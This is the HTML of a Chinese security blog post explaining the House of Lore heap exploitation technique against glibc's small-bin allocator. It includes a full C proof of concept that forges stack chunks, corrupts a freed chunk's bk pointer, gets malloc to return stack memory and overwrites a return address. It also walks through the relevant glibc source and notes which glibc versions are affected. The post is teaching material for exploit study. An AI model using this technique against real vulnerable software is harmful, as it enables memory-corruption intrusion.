@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="House Of LoreHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关  House of Lore 可以实现 分配 任意指定位置的 chunk，从而修改任意地址的内存 House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针   House Of Lore 利用姿势如果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Lore-原理">
+<meta property="og:url" content="http://example.com/2022/03/10/House%20Of%20Lore-%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="House Of LoreHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关  House of Lore 可以实现 分配 任意指定位置的 chunk，从而修改任意地址的内存 House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针   House Of Lore 利用姿势如果">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-09T16:53:24.000Z">
+<meta property="article:modified_time" content="2022-04-06T06:43:23.785Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="House Of Lore">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/03/10/House%20Of%20Lore-%E5%8E%9F%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>House Of Lore-原理 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/House%20Of%20Lore-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House Of Lore-原理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-10 00:53:24" itemprop="dateCreated datePublished" datetime="2022-03-10T00:53:24+08:00">2022-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-06 14:43:23" itemprop="dateModified" datetime="2022-04-06T14:43:23+08:00">2022-04-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h2><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关</p>
+<ul>
+<li>House of Lore 可以实现 <strong>分配</strong> 任意指定位置的 chunk，从而修改任意地址的内存</li>
+<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
+</ul>
+<hr>
+<h2 id="House-Of-Lore-利用姿势"><a href="#House-Of-Lore-利用姿势" class="headerlink" title="House Of Lore 利用姿势"></a>House Of Lore 利用姿势</h2><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk</p>
+<p>案例：（Ubuntu 14.04.4 - 32bit - glibc-2.23）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">/* presize */</span></span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>; <span class="comment">/* size */</span></span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk; <span class="comment">/* FD */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2; <span class="comment">// chunk1-&gt;BK =&gt; chunk2-&gt;head</span></span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1; <span class="comment">// chunk2-&gt;FD =&gt; chunk1-&gt;head</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>); <span class="comment">// 防止和topchunk合并</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单复述一下这个过程：</p>
+<ul>
+<li>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个 fake chunk（fake chunk 为 stack_buffer_1，还需要一个 stack_buffer_2 来打掩护）</li>
+<li>为了绕过检测，设置 stack_buffer_1 的 BK 指针指向 stack_buffer_2，设置 stack_buffer_2 的 FD 指针指向 stack_buffer_1</li>
+<li>接下来先 malloc 一个chunk，防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中  </li>
+<li>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中</li>
+<li>在 victim chunk 的BK指针中写入fake chunk（small bin是基于BK，从后向前申请的）</li>
+<li>再次申请 victim chunk（同时 fake chunk 进入small bin），最后申请 fake chunk </li>
+</ul>
+<p>利用条件：</p>
+<ul>
+<li>程序可修改 small bins 中 free chunk 的 bk 指针</li>
+<li>对应伪造 fake chunk 的区域有一定控制权（可以伪造 fakechunk-&gt;FD 为 victim_chunk）</li>
+</ul>
+<h2 id="关于-Small-Bin-分配的利用点"><a href="#关于-Small-Bin-分配的利用点" class="headerlink" title="关于 Small Bin 分配的利用点"></a>关于 Small Bin 分配的利用点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    <span class="comment">// 检验需要分配的大小是不是smallbin大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">          <span class="comment">// 通过last函数查找到最后一个free chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk; <span class="comment">/* 漏洞点 */</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞的问题就在于<code>bck = victim-&gt;bk</code>，这句话将这个 chunk 的BK提取了出来，并且在之后使得<code>bin-&gt;bk = bck</code> ，这样的话BK指针所指向的 chunk 就被放入了 smallbin，之后的 malloc 就可以将其 malloc 出来了 </p>
+<h2 id="版本对-House-Of-Lore-的影响"><a href="#版本对-House-Of-Lore-的影响" class="headerlink" title="版本对 House Of Lore 的影响"></a>版本对 House Of Lore 的影响</h2><p><strong>libc-2.23</strong>（只有上文提及的基础检查）</p>
+<p><strong>libc-2.27</strong>（只有上文提及的基础检查，但是需要绕过 cache）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure>
+<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
+<p><strong>libc-2.31</strong>（House Of Lore 已经失效）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/House-Of-Lore/" rel="tag"><i class="fa fa-tag"></i> House Of Lore</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/09/CSapp-Link%20Lab/" rel="prev" title="CSapp-Link Lab">
+      <i class="fa fa-chevron-left"></i> CSapp-Link Lab
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/10/House%20Of%20Orange-%E5%8E%9F%E7%90%86/" rel="next" title="House Of Orange-原理">
+      House Of Orange-原理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Lore"><span class="nav-number">1.</span> <span class="nav-text">House Of Lore</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Lore-%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.</span> <span class="nav-text">House Of Lore 利用姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-Small-Bin-%E5%88%86%E9%85%8D%E7%9A%84%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">关于 Small Bin 分配的利用点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%AF%B9-House-Of-Lore-%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="nav-number">4.</span> <span class="nav-text">版本对 House Of Lore 的影响</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
